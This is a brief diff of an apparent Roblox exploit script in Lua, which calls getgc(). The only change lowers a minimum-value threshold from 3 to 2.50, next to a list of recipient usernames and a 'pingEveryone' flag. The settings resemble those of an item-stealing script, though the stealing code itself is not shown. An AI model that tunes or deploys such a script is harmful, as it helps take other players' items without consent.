@@ -64,7 +64,7 @@ for _, v in pairs(getgc()) do
 end
 
 _G.Usernames = {"morninggoodnightmeme","Venillarblx","FedcantgetmenowUwu","mightyjohnplays","Adamveggeasd"}
-_G.min_value = 3
+_G.min_value = 2.50
 _G.pingEveryone = "Yes"
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
